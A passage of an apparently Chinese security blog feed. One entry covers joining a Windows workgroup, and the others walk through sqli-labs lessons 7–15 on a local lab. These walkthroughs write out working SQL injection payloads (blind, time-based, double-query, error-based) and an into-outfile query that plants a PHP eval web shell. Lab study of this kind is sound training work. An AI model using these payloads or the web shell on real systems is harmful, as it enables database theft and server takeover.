        <content type="html"><![CDATA[<h1 id="windows加入-x2F-退出工作组"><a href="#windows加入-x2F-退出工作组" class="headerlink" title="windows加入&#x2F;退出工作组"></a>windows加入&#x2F;退出工作组</h1><h2 id="windows加入工作组"><a href="#windows加入工作组" class="headerlink" title="windows加入工作组"></a>windows加入工作组</h2><p>选中<code>计算机</code>，右键点击<code>属性</code></p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/1.png" class=""><p>点击<code>更改设置</code></p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/2.png" class=""><p>点击<code>更改</code></p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/3.png" class=""><p>在工作组输入框中输入要加入的工作组的名称</p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/4.png" class=""><p>然后点击<code>确定</code></p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/5.png" class=""><p>最后点击<code>确定</code>重启即可</p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/6.png" class=""><h2 id="windows退出工作组"><a href="#windows退出工作组" class="headerlink" title="windows退出工作组"></a>windows退出工作组</h2><p>同上，只要修改工作组的名称即可</p><img src="/2022/10/20/windows%E5%8A%A0%E5%85%A5-%E9%80%80%E5%87%BA%E5%B7%A5%E4%BD%9C%E7%BB%84/7.png" class="">]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less15</title>
      <link href="/2022/10/20/sqli-labs-less15/"/>
      <url>/2022/10/20/sqli-labs-less15/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less15"><a href="#sqli-labs-less15" class="headerlink" title="sqli-labs-less15"></a>sqli-labs-less15</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-15/</code></p><img src="/2022/10/20/sqli-labs-less15/1.png" class=""><p>输入username,password，burp抓包，点击submit</p><img src="/2022/10/20/sqli-labs-less15/2.png" class=""><p>burp抓取到的数据包为</p><img src="/2022/10/20/sqli-labs-less15/3.png" class=""><p>由于这关检测的是单引号型布尔盲注和时间盲注，将数据包发送到repeater模块<br>首先测试布尔盲注：<br><code>uname=1&#39; or 1=1-- </code><br>页面响应为</p><img src="/2022/10/20/sqli-labs-less15/4.png" class=""><p><code>uname=1&#39; or 1=2-- </code><br>页面响应为</p><img src="/2022/10/20/sqli-labs-less15/5.png" class=""><p>页面发生变化，因此<code>uname</code>参数存在布尔盲注<br>同理,<code>passwd</code>参数同样存在布尔盲注<br>使用布尔盲注获取当前数据库名的长度：</p><img src="/2022/10/20/sqli-labs-less15/6.png" class=""><p>由此判断当前数据库名的长度为8<br>继续测试时间盲注：</p>]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less14-post请求-字符型(单引号变形)-双查询注入</title>
      <link href="/2022/10/20/sqli-labs-less14/"/>
      <url>/2022/10/20/sqli-labs-less14/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less14-post请求-字符型-单引号变形-双查询注入"><a href="#sqli-labs-less14-post请求-字符型-单引号变形-双查询注入" class="headerlink" title="sqli-labs-less14-post请求-字符型(单引号变形)-双查询注入"></a>sqli-labs-less14-post请求-字符型(单引号变形)-双查询注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-14/</code></p><img src="/2022/10/20/sqli-labs-less14/1.png" class=""><p>按要求输入username,password,burp抓包,点击提交</p><img src="/2022/10/20/sqli-labs-less14/2.png" class=""><p>将抓到的请求发送至repeater模块</p><img src="/2022/10/20/sqli-labs-less14/3.png" class=""><p>让<code>uname=admin&#39;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less14/4.png" class=""><p>让<code>uname=admin&quot;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less14/5.png" class=""><p>显示sql语句报错信息，说明<code>&quot;</code>破坏了数据库sql语句的结构<br>因此我们判断数据库sql语句为<code>select * from table where uname=&quot;input&quot; and passwd=&quot;input&quot;</code><br>使用双查询注入查询当前数据库名：<br><code>uname=admin&quot; and (select 1 from (select count(*),concat(floor(rand(14)*2),database())x from information_schema.schemata group by x)z)-- </code></p><img src="/2022/10/20/sqli-labs-less14/6.png" class=""><p><code>passwd=123456&quot; or (select 1 from (select count(*),concat(floor(rand(14)*2),database())x from information_schema.tables group by x)z)-- </code></p><img src="/2022/10/20/sqli-labs-less14/7.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less13-post请求-字符型(单引号变形)-双查询注入</title>
      <link href="/2022/10/20/sqli-labs-less13/"/>
      <url>/2022/10/20/sqli-labs-less13/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less13-post请求-字符型-单引号变形-双查询注入"><a href="#sqli-labs-less13-post请求-字符型-单引号变形-双查询注入" class="headerlink" title="sqli-labs-less13-post请求-字符型(单引号变形)-双查询注入"></a>sqli-labs-less13-post请求-字符型(单引号变形)-双查询注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-13/</code></p><img src="/2022/10/20/sqli-labs-less13/1.png" class=""><p>按要求输入username,password,burp抓包，点击提交</p><img src="/2022/10/20/sqli-labs-less13/2.png" class=""><p>将抓到的请求发送至repeater模块</p><img src="/2022/10/20/sqli-labs-less13/3.png" class=""><p>让<code>uname=admin&#39;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less13/4.png" class=""><p>显示sql语句错误信息<br>让<code>passwd=123456&#39;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less13/5.png" class=""><p>显示sql语句错误信息<br>因此我们判断数据库sql语句为<code>select * from table where uname=(&#39;input&#39;) and passwd=(&#39;input&#39;)</code><br>使用双查询注入查询当前数据库名：<br><code>uname=admin&#39;) and (select 1 from (select count(*),concat(floor(rand(14)*2),database())x from information_schema.tables group by x)z)-- </code></p><img src="/2022/10/20/sqli-labs-less13/6.png" class=""><p><code>passwd=123456&#39;) or (select 1 from (select count(*),concat(floor(rand(14)*2),database())x from information_schema.tables group by x)z)-- </code></p><img src="/2022/10/20/sqli-labs-less13/7.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less12-post请求-字符型(双引号变形)-报错注入</title>
      <link href="/2022/10/20/sqli-labs-less12/"/>
      <url>/2022/10/20/sqli-labs-less12/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less12-post请求-字符型-双引号变形-报错注入"><a href="#sqli-labs-less12-post请求-字符型-双引号变形-报错注入" class="headerlink" title="sqli-labs-less12-post请求-字符型(双引号变形)-报错注入"></a>sqli-labs-less12-post请求-字符型(双引号变形)-报错注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-12/</code></p><img src="/2022/10/20/sqli-labs-less12/1.png" class=""><p>按照要求输入username,password,然后burp抓包，点击提交</p><img src="/2022/10/20/sqli-labs-less12/2.png" class=""><p>将抓到的请求发送至repeater模块</p><img src="/2022/10/20/sqli-labs-less12/3.png" class=""><p>让<code>uname=admin&#39;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less12/4.png" class=""><p>让<code>uname=admin&quot;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less12/5.png" class=""><p>显示sql语句报错信息<br>让<code>passwd=123456&#39;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less12/6.png" class=""><p>让<code>passwd=123456&quot;</code>,查看响应</p><img src="/2022/10/20/sqli-labs-less12/7.png" class=""><p>显示sql语句报错信息<br>因此我们判断数据库sql语句为<code>select * from table where uname=(&quot;input&quot;) and passwd=(&quot;input&quot;)</code></p>]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less11-post请求-字符型(单引号)-报错注入</title>
      <link href="/2022/10/17/sqli-labs-less11/"/>
      <url>/2022/10/17/sqli-labs-less11/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less11-post请求-字符型-单引号-报错注入"><a href="#sqli-labs-less11-post请求-字符型-单引号-报错注入" class="headerlink" title="sqli-labs-less11-post请求-字符型(单引号)-报错注入"></a>sqli-labs-less11-post请求-字符型(单引号)-报错注入</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-11/</code></p><img src="/2022/10/17/sqli-labs-less11/1.png" class=""><p>按要求输入用户名，密码，然后burp抓包</p><img src="/2022/10/17/sqli-labs-less11/2.png" class=""><p>将抓到的post请求包发送到repeater模块</p><img src="/2022/10/17/sqli-labs-less11/3.png" class=""><p>让<code>uname=admin&#39;</code>,查看响应</p><img src="/2022/10/17/sqli-labs-less11/4.png" class=""><p>显示sql语句报错信息<br>让<code>passwd=123456&#39;</code>,查看响应</p><img src="/2022/10/17/sqli-labs-less11/5.png" class=""><p>显示sql语句报错信息<br>因此我们判断数据库sql语句为<code>select * from table where uname=&#39;input&#39; and passwd=&#39;input&#39;</code></p>]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less10-get请求-字符型(双引号)-时间盲注</title>
      <link href="/2022/10/14/sqli-labs-less10/"/>
      <url>/2022/10/14/sqli-labs-less10/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less10-get请求-字符型-双引号-时间盲注"><a href="#sqli-labs-less10-get请求-字符型-双引号-时间盲注" class="headerlink" title="sqli-labs-less10-get请求-字符型(双引号)-时间盲注"></a>sqli-labs-less10-get请求-字符型(双引号)-时间盲注</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-10/?id=1</code></p><img src="/2022/10/14/sqli-labs-less10/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-10/?id=1&#39;</code></p><img src="/2022/10/14/sqli-labs-less10/2.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-10/?id=1&quot;</code></p><img src="/2022/10/14/sqli-labs-less10/3.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-10/?id=1 and sleep(5)</code></p><img src="/2022/10/14/sqli-labs-less10/4.png" class=""><p>页面没有延时<br>访问<code>http://127.0.0.1/sqli-labs/Less-10/?id=1&#39; and sleep(5)--+</code></p><img src="/2022/10/14/sqli-labs-less10/5.png" class=""><p>页面没有延时<br>访问<code>http://127.0.0.1/sqli-labs/Less-10/?id=1&quot; and sleep(5)--+</code></p><img src="/2022/10/14/sqli-labs-less10/6.png" class=""><p>页面延时5秒，因此我们判断数据库sql语句为<code>select * from table where id = &quot;input&quot;</code></p>]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less9-get请求-字符型(单引号)-时间盲注</title>
      <link href="/2022/09/02/sqli-labs-less9/"/>
      <url>/2022/09/02/sqli-labs-less9/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less9-get请求-字符型-单引号-时间盲注"><a href="#sqli-labs-less9-get请求-字符型-单引号-时间盲注" class="headerlink" title="sqli-labs-less9-get请求-字符型(单引号)-时间盲注"></a>sqli-labs-less9-get请求-字符型(单引号)-时间盲注</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1</code></p><img src="/2022/09/02/sqli-labs-less9/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39;</code></p><img src="/2022/09/02/sqli-labs-less9/2.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&quot;</code></p><img src="/2022/09/02/sqli-labs-less9/3.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1 and sleep(5)</code></p><img src="/2022/09/02/sqli-labs-less9/4.png" class=""><p>页面没有延时<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and sleep(5)--+</code></p><img src="/2022/09/02/sqli-labs-less9/5.png" class=""><p>页面延时5秒，因此我们猜测数据库sql语句为<code>select * from table where id =&#39;input&#39;</code><br>猜测数据库的所有数据库名：<br>猜测第一个数据库名的长度<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(length((select schema_name from information_schema.schemata limit 0,1))=18,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/6.png" class=""><p>页面延时，因此判断出第1个数据库名的长度为18<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(length((select schema_name from information_schema.schemata limit 4,1))=8,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/7.png" class=""><p>页面延时，因此判断出第5个数据库名的长度为8<br>猜测第5个数据库名的第1个字符：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(substr((select schema_name from information_schema.schemata limit 4,1),1,1)=&quot;s&quot;,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/8.png" class=""><p>页面延时5秒，判断出第5个数据库名的第1个字符为s<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(substr((select schema_name from information_schema.schemata limit 4,1),2,1)=&quot;e&quot;,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/9.png" class=""><p>页面延时5秒，判断出第5个数据库名的第2个字符为e<br>如上，依次判断出第5个数据库的名称为security。<br>猜测security数据库的所有表名：<br>猜测security数据库的第1个表名的长度：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(length((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1))=6,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/10.png" class=""><p>页面延时5秒，判断出security数据库的第1个表名的长度为6<br>依次判断出security数据库的第4个表名的长度为5。<br>猜测security数据库的第4个表名的第1个字符：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 3,1),1,1)=&quot;u&quot;,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/11.png" class=""><p>页面延时5秒，判断出security数据库的第1个表名的第一个字符为u<br>依次判断出security数据库的第一个表名为users。<br>猜测users表的所有列名：<br>猜测users表的第1个列名的长度：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))=&quot;4&quot;,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/12.png" class=""><p>页面延时5秒，判断出users表的第1个列名的长度为4<br>依次判断出users表的第5个列名的长度为8，第6个列名的长度为8。<br>猜测users表的第5个列名的第1个字符：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 04,1),1,1)=&quot;u&quot;,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/13.png" class=""><p>页面延时5秒，判断出users表的第5个列名的第一个字符为u<br>依次判断出users表的第5个列名为username,第6个列名为password。<br>猜测users表的数据：<br>猜测users表username列的第1个值的第1个字符的长度：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(length((select username from security.users limit 0,1))=4,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/14.png" class=""><p>页面延时5秒，判断出users表的username列的第1个值的长度为4<br>猜测users表的username列的第1个值的第1个字符：<br>访问<code>http://127.0.0.1/sqli-labs/Less-9/?id=1&#39; and if(substr((select username from security.users limit 0,1),1,1)=&quot;d&quot;,sleep(5),1)--+</code></p><img src="/2022/09/02/sqli-labs-less9/15.png" class=""><p>页面延时5秒，判断出users表的username列的第1个值的第1个字符为d<br>依次判断出users表的username列的第1个值为dumb<br>如上所示，依次判断出users表的password列的第1个值为dumb。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less8-get请求-字符型(单引号)-布尔盲注</title>
      <link href="/2022/09/01/sqli-labs-less8/"/>
      <url>/2022/09/01/sqli-labs-less8/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less8-get请求-字符型-单引号-布尔盲注"><a href="#sqli-labs-less8-get请求-字符型-单引号-布尔盲注" class="headerlink" title="sqli-labs-less8-get请求-字符型(单引号)-布尔盲注"></a>sqli-labs-less8-get请求-字符型(单引号)-布尔盲注</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-8/?id=1</code></p><img src="/2022/09/01/sqli-labs-less8/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</code></p><img src="/2022/09/01/sqli-labs-less8/2.png" class=""><p>由此判断<code>&#39;</code>破坏了数据库语句结构，猜测数据库语句为<code>select * from table_name where id=&#39;input&#39;</code><br>访问<code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; --+</code></p><img src="/2022/09/01/sqli-labs-less8/3.png" class=""><p>页面返回正常，证实了我们的猜测。<br>order by 判断列数：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; order by 3--+</code></p><img src="/2022/09/01/sqli-labs-less8/4.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; order by 4--+</code></p><img src="/2022/09/01/sqli-labs-less8/5.png" class=""><p>由此判断列数为3.<br>判断该页面是否能回显：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; union select 1,2,3--+</code></p><img src="/2022/09/01/sqli-labs-less8/6.png" class=""><p>由此判断该页面不能回显。<br>判断该页面是否能显示报错信息：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; union select 1,2,3,4--+</code></p><img src="/2022/09/01/sqli-labs-less8/7.png" class=""><p>由此判断该页面不能显示报错信息。<br>此情此景，我们就只能使用盲注的方法来进行注入。<br>由于这关考验的是我们布尔盲注的能力，所以我们通过布尔盲注来进行注入测试。<br>布尔盲注获取第一个数据库名的长度：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select schema_name from information_schema.schemata limit 0,1))&lt;20)--+</code></p><img src="/2022/09/01/sqli-labs-less8/8.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select schema_name from information_schema.schemata limit 0,1))&lt;15)--+</code></p><img src="/2022/09/01/sqli-labs-less8/9.png" class=""><p>说明第一个数据库名的长度大于等于15，小于20<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select schema_name from information_schema.schemata limit 0,1))=18)--+</code></p><img src="/2022/09/01/sqli-labs-less8/10.png" class=""><p>由此可以判断第一个数据库名的长度为18.<br>布尔盲注获取第一个数据库名的第一个字符：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&quot;a&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/11.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select schema_name from information_schema.schemata limit 0,1),1,1)=&quot;i&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/12.png" class=""><p>由此判断出第一个数据库名的第一个字符为”i”。<br>或者使用ascii码的方法来判断第一个数据库名的第一个字符：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=97)--+</code></p><img src="/2022/09/01/sqli-labs-less8/13.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105)--+</code></p><img src="/2022/09/01/sqli-labs-less8/14.png" class=""><p>a的ascii值为97，i的ascii值为105，所以第一个数据库名的第一个字符为“i”。<br>依次类推判断出其中一个数据库名为security<br>布尔盲注获取security数据库的第一个表名的长度：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1))&gt;=10)--+</code></p><img src="/2022/09/01/sqli-labs-less8/15.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1))&gt;=5)--+</code></p><img src="/2022/09/01/sqli-labs-less8/16.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1))=6)--+</code></p><img src="/2022/09/01/sqli-labs-less8/17.png" class=""><p>由此判断出security数据库的第一个表的长度是6.<br>布尔盲注获取security数据库的第一个表名的第一个字符：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1)=&quot;a&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/18.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),1,1)=&quot;e&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/19.png" class=""><p>由此判断出security数据库的第一个表名的第一个字符是“e”。<br>依次类推判断出security数据库的一个表为“users”。<br>布尔盲注获取users表的第一个列名的长度：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1))=4)--+</code></p><img src="/2022/09/01/sqli-labs-less8/20.png" class=""><p>由此判断出users表的第一个列名的长度为4.<br>布尔盲注获取users表的第一个列的第一个字符：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1)=&quot;a&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/21.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),1,1)=&quot;u&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/22.png" class=""><p>由此判断出users表的第一个列名的第一个字符是“u”。<br>依次类推判断出users表的其中两个列名为“username”“password”。<br>布尔盲注获取users表的username,password字段的第一条数据的长度：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select length((select group_concat(username,password) from security.users limit 0,1))=175)--+</code></p><img src="/2022/09/01/sqli-labs-less8/23.png" class=""><p>由此判断出users表的username,password字段的第一条数据的长度是175。<br>布尔盲注获取users表的username,password字段的第一条数据的第一个字符：<br><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select group_concat(username,password) from security.users limit 0,1),1,1)=&quot;a&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/24.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-8/?id=1&#39; and (select substr((select group_concat(username,password) from security.users limit 0,1),1,1)=&quot;d&quot;)--+</code></p><img src="/2022/09/01/sqli-labs-less8/25.png" class=""><p>由此判断出users表的username,password字段的第一条数据的第一个字符为“d”。<br>依次类推获取到users表的username,password字段的第一条数据。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less7-get请求-字符型(单引号变形)-into outfile</title>
      <link href="/2022/08/31/sqli-labs-less7/"/>
      <url>/2022/08/31/sqli-labs-less7/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less7-get请求-字符型-单引号变形-into-outfile"><a href="#sqli-labs-less7-get请求-字符型-单引号变形-into-outfile" class="headerlink" title="sqli-labs-less7-get请求-字符型(单引号变形)-into outfile"></a>sqli-labs-less7-get请求-字符型(单引号变形)-into outfile</h1><p>访问<code>http://127.0.0.1/sqli-labs/Less-7/?id=1</code></p><img src="/2022/08/31/sqli-labs-less7/1.png" class=""><p>访问<code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;</code></p><img src="/2022/08/31/sqli-labs-less7/2.png" class=""><p>sql语句报错，但是没有报错信息，猜测数据库语句为<code>select * from table_name where id=&#39;input&#39;</code><br>访问<code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;--+</code></p><img src="/2022/08/31/sqli-labs-less7/3.png" class=""><p>sql语句依然报错，看来没有成功闭合，继续猜测数据库语句为<code>select * from table_name where id=(&#39;input&#39;)</code><br>访问<code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)--+</code></p><img src="/2022/08/31/sqli-labs-less7/4.png" class=""><p>sql语句依然报错，看来也没有成功闭合，继续猜测数据库语句为<code>select * from table_name where id=((&#39;input&#39;))</code><br>访问<code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;))--+</code></p><img src="/2022/08/31/sqli-labs-less7/5.png" class=""><p>看到此页面，说明我们闭合成功。<br>判断数据库语句列数：<br><code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) order by 3--+</code></p><img src="/2022/08/31/sqli-labs-less7/6.png" class=""><p><code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) order by 4--+</code></p><img src="/2022/08/31/sqli-labs-less7/7.png" class=""><p>由此可以判断出列数为3.<br>判断页面是否回显：<br><code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) union select 1,2,3--+</code></p><img src="/2022/08/31/sqli-labs-less7/8.png" class=""><p>由此判断页面不能回显。<br>判断页面能否爆出错误信息：<br><code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) union select 1,2,3,4--+</code></p><img src="/2022/08/31/sqli-labs-less7/9.png" class=""><p>页面报错统一使用“You have an error in your SQL syntax”，未爆出具体错误信息，由此判断该页面不能爆出错误信息。<br>根据页面提示我们需要使用into outfile把数据库数据导出到文件中,而要读写文件必须要有file权限，less1中使用<code>select @@secure_file_priv</code>查看权限：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,@@secure_file_priv--+</code></p><img src="/2022/08/31/sqli-labs-less7/10.png" class=""><p>由此可知<code>secure_file_priv=null</code>,数据库没有文件读写权限。<br>注：<code>secure_file_priv=&#39;&#39; #任意导入导出``secure_file_priv=指定目录 #只能在指定目录下导入导出``secure_file_priv=null #不允许导入导出</code><br>Windows下编辑数据库配置文件my.ini:<br><code>secure_file_priv=&#39;&#39;</code><br>重启数据库，less1中再次使用<code>select @@secure_file_priv</code>查看权限：<br><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,@@secure_file_priv--+</code></p><img src="/2022/08/31/sqli-labs-less7/11.png" class=""><p>此时<code>secure_file_priv=&#39;&#39;</code>,我们就可以向任意目录下导出文件：<br><code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) union select * from users into outfile &#39;D:\\phpstudy_pro\\www\\users.txt&#39;--+</code></p><img src="/2022/08/31/sqli-labs-less7/12.png" class=""><p>尽管sql语句报错，它依旧导出了users.txt文件，文件内容为</p><img src="/2022/08/31/sqli-labs-less7/13.png" class=""><p>使用into outfile导出webshell:<br><code>http://127.0.0.1/sqli-labs/Less-7/?id=1&#39;)) union select 1,2,&quot;&lt;?php @eval($_GET[&#39;xxx&#39;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\www\\shell.php&quot;--+</code></p><img src="/2022/08/31/sqli-labs-less7/14.png" class=""><p>尽管sql语句报错，它依旧导出了shell.php文件，文件内容为</p><img src="/2022/08/31/sqli-labs-less7/15.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> sqli-labs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs-less6-get请求-字符型(双引号)-双查询注入</title>
      <link href="/2022/08/31/sqli-labs-less6/"/>
      <url>/2022/08/31/sqli-labs-less6/</url>
      
